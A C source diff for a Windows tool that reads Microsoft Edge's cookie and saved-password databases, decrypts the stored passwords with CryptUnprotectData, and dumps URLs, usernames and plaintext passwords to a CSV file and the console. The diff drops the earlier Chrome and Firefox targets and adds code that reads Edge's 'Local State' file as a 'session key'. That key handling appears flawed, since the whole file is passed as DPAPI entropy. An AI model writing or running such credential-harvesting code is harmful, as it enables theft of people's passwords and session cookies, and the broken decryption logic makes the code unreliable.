@@ -32,13 +32,13 @@ void write_to_csv(FILE *file, const char *type, const char *col1, const char *co
     printf("Writing to CSV: %s, %s, %s, %s\n", type, col1, col2, col3);
 }
 
-char* decrypt_password(const void *enc_data, int enc_data_len) {
+char* decrypt_password(const void *enc_data, int enc_data_len, const void *entropy, int entropy_len) {
     if (enc_data == NULL || enc_data_len <= 0) {
         fprintf(stderr, "Invalid encrypted data or length\n");
         return NULL;
     }
 
-    DATA_BLOB in_blob, out_blob;
+    DATA_BLOB in_blob, out_blob, entropy_blob;
     in_blob.pbData = (BYTE *)enc_data;
     in_blob.cbData = enc_data_len;
 
@@ -52,7 +52,14 @@ char* decrypt_password(const void *enc_data, int enc_data_len) {
     printf("in_blob.pbData: %p\n", in_blob.pbData);
     printf("in_blob.cbData: %d\n", in_blob.cbData);
 
-    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
+    DATA_BLOB *pEntropyBlob = NULL;
+    if (entropy != NULL && entropy_len > 0) {
+        entropy_blob.pbData = (BYTE *)entropy;
+        entropy_blob.cbData = entropy_len;
+        pEntropyBlob = &entropy_blob;
+    }
+
+    if (CryptUnprotectData(&in_blob, NULL, pEntropyBlob, NULL, NULL, 0, &out_blob)) {
         char *dec_data = (char *)malloc(out_blob.cbData + 1);
         if (dec_data == NULL) {
             fprintf(stderr, "Memory allocation failed\n");
@@ -103,6 +110,43 @@ void read_passwords(sqlite3 *db, FILE *file) {
         return;
     }
 
+    // Obtain the Edge session key from the default path
+    char session_key_path[MAX_PATH];
+    snprintf(session_key_path, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Local State", getenv("LOCALAPPDATA"));
+    FILE *key_file = fopen(session_key_path, "rb");
+    if (!key_file) {
+        fprintf(stderr, "Failed to open session key file\n");
+        return;
+    }
+    fseek(key_file, 0, SEEK_END);
+    int key_len = ftell(key_file);
+    fseek(key_file, 0, SEEK_SET);
+    void *session_key = malloc(key_len);
+    if (!session_key) {
+        fprintf(stderr, "Memory allocation failed\n");
+        fclose(key_file);
+        return;
+    }
+    fread(session_key, 1, key_len, key_file);
+    fclose(key_file);
+
+    // Print the session key to the console and output.csv
+    printf("Session key length: %d\n", key_len);
+    printf("Session key: ");
+    for (int i = 0; i < key_len; i++) {
+        printf("%02x ", ((unsigned char *)session_key)[i]);
+    }
+    printf("\n");
+
+    fprintf(file, "Session Key,");
+    for (int i = 0; i < key_len; i++) {
+        fprintf(file, "%02x", ((unsigned char *)session_key)[i]);
+        if (i < key_len - 1) {
+            fprintf(file, " ");
+        }
+    }
+    fprintf(file, "\n");
+
     while (sqlite3_step(res) == SQLITE_ROW) {
         const char *origin_url = (const char *)sqlite3_column_text(res, 0);
         const char *username_value = (const char *)sqlite3_column_text(res, 1);
@@ -115,7 +159,7 @@ void read_passwords(sqlite3 *db, FILE *file) {
         }
         printf("\n");
 
-        char *dec_password = decrypt_password(password_value, password_len);
+        char *dec_password = decrypt_password(password_value, password_len, session_key, key_len);
         if (dec_password) {
             printf("Read password: %s, %s, %s\n", origin_url, username_value, dec_password);
             write_to_csv(file, "Password", origin_url, username_value, dec_password);
@@ -123,6 +167,7 @@ void read_passwords(sqlite3 *db, FILE *file) {
         }
     }
 
+    free(session_key);
     sqlite3_finalize(res);
 }
 
@@ -159,39 +204,17 @@ void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FI
     sqlite3_close(db);
 }
 
-void get_firefox_profile_path(char *profile_path, size_t size) {
-    char appdata[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
-        snprintf(profile_path, size, "%s\\Mozilla\\Firefox\\Profiles", appdata);
-    }
-}
-
 int main() {
     char edge_cookies[MAX_PATH];
     char edge_passwords[MAX_PATH];
-    char chrome_cookies[MAX_PATH];
-    char chrome_passwords[MAX_PATH];
-    char firefox_profile[MAX_PATH];
-    char firefox_cookies[MAX_PATH];
 
     // Get paths for Edge
     snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
     snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
 
-    // Get paths for Chrome
-    snprintf(chrome_cookies, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
-    snprintf(chrome_passwords, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
-
-    // Get path for Firefox profile
-    get_firefox_profile_path(firefox_profile, MAX_PATH);
-    snprintf(firefox_cookies, MAX_PATH, "%s\\<profile>\\cookies.sqlite", firefox_profile); // Replace <profile> with actual profile name
-
     // Print paths for verification
     printf("Edge cookies path: %s\n", edge_cookies);
     printf("Edge passwords path: %s\n", edge_passwords);
-    printf("Chrome cookies path: %s\n", chrome_cookies);
-    printf("Chrome passwords path: %s\n", chrome_passwords);
-    printf("Firefox cookies path: %s\n", firefox_cookies);
 
     FILE *file = fopen("output.csv", "w");
     if (!file) {
@@ -204,13 +227,6 @@ int main() {
     printf("Reading Edge cookies and passwords...\n");
     read_database(edge_cookies, read_cookies, file);
     read_database(edge_passwords, read_passwords, file);
-
-    printf("Reading Chrome cookies and passwords...\n");
-    read_database(chrome_cookies, read_cookies, file);
-    read_database(chrome_passwords, read_passwords, file);
-
-    printf("Reading Firefox cookies...\n");
-    read_database(firefox_cookies, read_cookies, file);
 
     fclose(file);
 
